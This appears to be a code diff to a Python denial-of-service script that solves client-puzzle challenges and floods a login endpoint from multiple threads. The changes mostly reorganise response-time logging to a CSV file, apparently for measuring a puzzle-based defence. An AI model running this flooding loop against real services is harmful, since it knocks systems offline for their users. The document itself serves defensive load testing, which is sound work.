@@ -83,19 +83,12 @@ def dos_request(url, headers):
     if not os.path.exists(output_file):
         os.makedirs(output_file)
 
-    # open the file in write mode
-    with open(
-        os.path.join(output_file, "attack_response_time.csv"), "w", encoding="utf-8"
-    ) as f:
-        writer = csv.writer(f)
-        # write the header
-        writer.writerow(["timestamp", "status_code", "response_time"])
-
     while num_requests > 0:
         try:
             c = get_challenge(url)
             if c is None:
-                print("Failed to get challenge C.")
+                # print("Failed to get challenge C.")
+                print("The DoS attack failed.")
                 break
             x = solve_puzzle(c)
             payload = f"email=dos_attack&password=dos_attack&puzzle_c={c}&puzzle_x={x}"
@@ -110,7 +103,7 @@ def dos_request(url, headers):
             time_taken = (end_time - start_time) * 1000  # convert to milliseconds
             # write the data to the file
             with open(
-                os.path.join(output_file, "attack_response_time.csv"),
+                os.path.join(output_file, "attack_response_time_safe.csv"),
                 "a",
                 encoding="utf-8",
                 newline="",
@@ -118,6 +111,10 @@ def dos_request(url, headers):
                 writer = csv.writer(f)
                 # write the data
                 writer.writerow([time.time(), response.status_code, time_taken])
+                # print(
+                #     f"Writing to file: {time.time()}, {response.status_code}, {time_taken}"
+                # )
+                f.flush()
             print(f"Sending DoS request, Status Code: {response.status_code}")
             # time.sleep(0.5)  # Adjust the sleep time as needed 0.1 seconds
             num_requests -= 1
@@ -160,6 +157,18 @@ def dos_attack():
 
     # begin the DoS attack
     print("Starting DoS attack...")
+
+    # open the file in write mode
+    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    output_file = os.path.join(project_root, "Resource_Usage")
+    with open(
+        os.path.join(output_file, "attack_response_time_safe.csv"),
+        "w",
+        encoding="utf-8",
+    ) as f:
+        writer = csv.writer(f)
+        # write the header
+        writer.writerow(["timestamp", "status_code", "response_time"])
 
     for i in range(multi_thread):
         thread = threading.Thread(target=dos_request, args=(url, headers))
